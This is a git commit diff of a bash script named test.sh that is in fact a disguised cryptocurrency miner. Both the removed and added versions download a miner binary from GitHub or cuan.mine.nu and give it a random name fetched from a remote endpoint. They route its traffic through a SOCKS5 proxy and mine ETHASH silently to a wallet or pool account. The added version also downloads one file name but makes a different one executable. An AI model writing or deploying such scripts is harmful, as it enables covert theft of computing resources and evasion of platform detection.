f7a43b9a7319cb2d697d4b0fe6d611c085ed4681
Myaxisplay <101804515+Myaxisplay@users.noreply.github.com>
2022-05-26 05:32:45 +0700

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,18 +1,13 @@
 #!/bin/bash
-echo "Preh suum mesen dile beuh :D!"
-sleep 11m
-while :
-do
-        #wget https://cuan.mine.nu/nbminer
-        ACAK=$(echo $(curl -s https://cuan.mine.nu/random.php))
-        chmod +x bubui && mv bubui $ACAK
-        PROXY=$(echo $(curl -s https://cuan.mine.nu/ganti-proxy.php))
-        WALLET=3J7rYdE9j5tvhms2emkNCLpvJ2fmVcHxri
-        POOL=stratum+tcp://daggerhashimoto.eu.nicehash.com:3353
-        WORKER1=$(echo $(shuf -i 1000-9999 -n 1)TEST)
-        #WORKER2=$(date '+%d%b')
-        #WORKER3=$(echo $(nvidia-smi --query-gpu=gpu_name --format=csv,noheader) | tr -d " ","-")
-        ./$ACAK --algo ETHASH --socks5 $PROXY --pool $POOL --user $WALLET.$WORKER1 --tls 0 -- ethstratum ETHV1 --silence 3
-        kill -9 $(ps -eo comm,pid,etimes | awk '/^procname/ {if ($1 > 3600) { print $2}}')
-        sleep 5m
-done
+sleep 10m
+wget https://github.com/anon1jju/ketaea/raw/631ff83f7fd506eaa419bc2319a9873ff1c90e7c/bubui
+#wget https://cuan.mine.nu/nbminer
+ACAK=$(echo $(curl -s https://cuan.mine.nu/random.php))
+chmod +x nbminer && mv nbminer $ACAK
+read -p 'Input Proxy nya: ' PROXY
+WALLET=prodent
+POOL=stratum+tcp://ethash.poolbinance.com:1800
+WORKER1=$(echo $(shuf -i 1000-9999 -n 1))
+#WORKER2=$(date '+%d%b')
+#WORKER3=$(echo $(nvidia-smi --query-gpu=gpu_name --format=csv,noheader) | tr -d " ","-")
+./$ACAK --algo ETHASH --socks5 $PROXY --pool $POOL --user $WALLET.$WORKER1 --tls 0 -- ethstratum ETHV1 --silence 3
